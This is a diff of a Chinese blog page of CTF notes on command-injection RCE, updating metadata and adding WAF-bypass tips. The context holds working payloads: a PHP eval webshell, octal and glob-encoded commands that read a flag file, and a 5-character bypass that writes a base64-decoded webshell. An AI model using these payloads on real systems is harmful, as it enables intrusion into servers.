@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://azumisaki.github.io/img/11.JPG">
 <meta property="article:published_time" content="2026-04-14T07:29:49.000Z">
-<meta property="article:modified_time" content="2026-04-14T11:24:06.721Z">
+<meta property="article:modified_time" content="2026-04-16T13:36:43.496Z">
 <meta property="article:author" content="AzumiSaki">
 <meta property="article:tag" content="-RCE漏洞">
 <meta name="twitter:card" content="summary_large_image">
@@ -240,7 +240,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.5k 字
+          3.6k 字
         
       </span>
     
@@ -297,7 +297,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2026年4月14日 晚上
+                    本文最后更新于 2026年4月16日 晚上
                   
                 
               </p>
@@ -324,7 +324,8 @@
 <h5 id="od-tx1"><a href="#od-tx1" class="headerlink" title="od -tx1"></a>od -tx1</h5><p>按十六进制、1字节一组显示。</p>
 <p>比如 61 62 63 就对应 abc。</p>
 <h5 id="od-a"><a href="#od-a" class="headerlink" title="od -a"></a>od -a</h5><p>显示字符名字，比如空格、换行之类。</p>
-<h2 id="Linux常用指令"><a href="#Linux常用指令" class="headerlink" title="Linux常用指令"></a>Linux常用指令</h2><h3 id="grep指令"><a href="#grep指令" class="headerlink" title="grep指令"></a>grep指令</h3><p>一般形式</p>
+<h2 id="Linux常用指令"><a href="#Linux常用指令" class="headerlink" title="Linux常用指令"></a>Linux常用指令</h2><h3 id="grep指令"><a href="#grep指令" class="headerlink" title="grep指令"></a>grep指令</h3><p>在线进制转换网址：<a target="_blank" rel="noopener" href="https://probiusofficial.github.io/bashFuck/">https://probiusofficial.github.io/bashFuck/</a></p>
+<p>一般形式</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep flag /tmp/flag.txt 意为“在/tmp/flag.txt里面抓取含有‘flag’开头的字符”<br>或者在当前目录里批量查找<br>grep -r <span class="hljs-string">&quot;flag&quot;</span><br></code></pre></td></tr></table></figure>
 
 <h4 id="4-常用参数"><a href="#4-常用参数" class="headerlink" title="4. 常用参数"></a>4. 常用参数</h4><hr>
@@ -667,7 +668,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>运行连接蚁剑，拿到flag</p>
-<h2 id="杂payload"><a href="#杂payload" class="headerlink" title="杂payload"></a>杂payload</h2><h4 id="一些绕过"><a href="#一些绕过" class="headerlink" title="一些绕过"></a>一些绕过</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$0</span> /???/????.???   ---/tmp/flag.txt<br>$<span class="hljs-string">&#x27;\143\141\164&#x27;</span> $<span class="hljs-string">&#x27;\057\164\155\160\057\146\154\141\147\056\164\170\164&#x27;</span>   ---转八进制<br>. /???/????.???   ---.加空格转为可读文件<br></code></pre></td></tr></table></figure>
+<h2 id="杂payload"><a href="#杂payload" class="headerlink" title="杂payload"></a>杂payload</h2><h4 id="一些绕过"><a href="#一些绕过" class="headerlink" title="一些绕过"></a>一些绕过</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$0</span> /???/????.???   ---/tmp/flag.txt<br>$<span class="hljs-string">&#x27;\143\141\164&#x27;</span> $<span class="hljs-string">&#x27;\057\164\155\160\057\146\154\141\147\056\164\170\164&#x27;</span>   ---转八进制<br>. /???/????.???   ---.加空格转为可读文件<br>在某些情况下，我们可能会需要用到8进制或者2进制来绕过一些很恶心的waf<br>当0和1被过滤了后呢，我们可以用<span class="hljs-variable">$&#123;#&#125;</span>来代替0,<span class="hljs-variable">$&#123;##&#125;</span>来代替1<br></code></pre></td></tr></table></figure>
 
 <h4 id="5字符限制绕过"><a href="#5字符限制绕过" class="headerlink" title="5字符限制绕过"></a>5字符限制绕过</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;l\\<br>&gt;s\\<br>&gt;\ \\<br>&gt;\&gt;0<br>&gt;-t\\<br><span class="hljs-built_in">ls</span>&gt;a<br><span class="hljs-built_in">ls</span>&gt;&gt;a<br>&gt;hp<br>&gt;p\\<br>&gt;1.\\<br>&gt;\&gt;\\<br>&gt;-d\\<br>&gt;\ \\<br>&gt;64\\<br>&gt;se\\<br>&gt;ba\\<br>&gt;\|\\<br>&gt;k7\\<br>&gt;XS\\<br>&gt;sx\\<br>&gt;VF\\<br>&gt;dF\\<br>&gt;X0\\<br>&gt;gk\\<br>&gt;bC\\<br>&gt;Zh\\<br>&gt;ZX\\<br>&gt;Ag\\<br>&gt;aH\\<br>&gt;9w\\<br>&gt;PD\\<br>&gt;S&#125;\\<br>&gt;IF\\<br>&gt;&#123;\\<br>&gt;\$\\<br>&gt;ho\\<br>&gt;ec\\<br>sh a<br>Sh 0<br>参数：1<br></code></pre></td></tr></table></figure>
 
